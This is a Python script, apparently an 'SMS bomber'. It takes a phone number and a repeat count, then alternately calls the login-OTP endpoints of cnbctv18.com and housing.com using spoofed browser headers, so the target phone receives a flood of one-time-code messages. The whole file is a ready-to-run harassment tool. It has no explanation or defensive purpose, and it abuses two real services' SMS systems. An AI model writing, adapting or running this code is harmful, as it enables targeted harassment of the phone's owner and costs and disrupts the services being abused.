import requests

number=input("Enter the phone number: ")
if not number.isdigit() or len(number) != 10:
    print("Please enter a valid 10-digit number.")
    exit()
times= int(input("Enter the number of times to send: "))

for i in range(times):
    if i % 2 == 0:
      print(i)
      url1 = "https://accounts.cnbctv18.com/apis/send_auth_otp"

      headers1 = {
        "Host": "accounts.cnbctv18.com",
        "Accept-Language": "en-GB,en;q=0.9",
        "Sec-Ch-Ua-Platform": "\"Linux\"",
        "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"99\", \"Chromium\";v=\"136\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://accounts.cnbctv18.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://accounts.cnbctv18.com/mclogin?v=2&cpurl=https://www.cnbctv18.com/market/stocks/insta-finance-share-price/SDF/",
      }

      cookies1 = {}

      payload1 = {
        "userid": {number},
        "formname": "login"
      }

      response1 = requests.post(url1, headers=headers1, cookies=cookies1, data=payload1)

      print("Status Code:", response1.status_code)

    if i % 2 != 0:
      #second request
      url = "https://mightyzeus-mum.housing.com/api/gql"
      params = {
      "apiName": "LOGIN_SEND_OTP_API",
      "emittedFrom": "client_buy_home",
      "isBot": "false",
      "platform": "desktop",
      "source": "web",
      "source_name": "AudienceWeb"
      }
  
      headers = {
      "Host": "mightyzeus-mum.housing.com",
      "App-Name": "desktop_web_buyer",
      "Accept-Language": "en-GB,en;q=0.9",
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
      "Phoenix-Api-Name": "LOGIN_SEND_OTP_API",
      "Content-Type": "application/json; charset=UTF-8",
      "Accept": "*/*",
      "Origin": "https://housing.com",
      "Referer": "https://housing.com/",
      }

      cookies = {
    # Paste your cookies here as key-value pairs, e.g.:
    # "ssrExperiments": "newrelic_browser=old80;pdp_rv=true;promoday=true",
      }

      data = {
      "query": """
      mutation(
        $email: String
        $phone: String
        $otpLength: Int
        $userAgent: String
        $method: String
        $preference: String
      ) {
        sendOtp(
          phone: $phone
          email: $email
          otpLength: $otpLength
          userAgent: $userAgent
          method: $method
          preference: $preference
        ) {
          success
          message
        }
      }
      """,
      "variables": {
          "phone": number,
          "userAgent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
      }
      }

      response = requests.post(url, params=params, headers=headers, cookies=cookies, json=data)

      print("Status Code:", response.status_code)
      print("Response:", response.text)


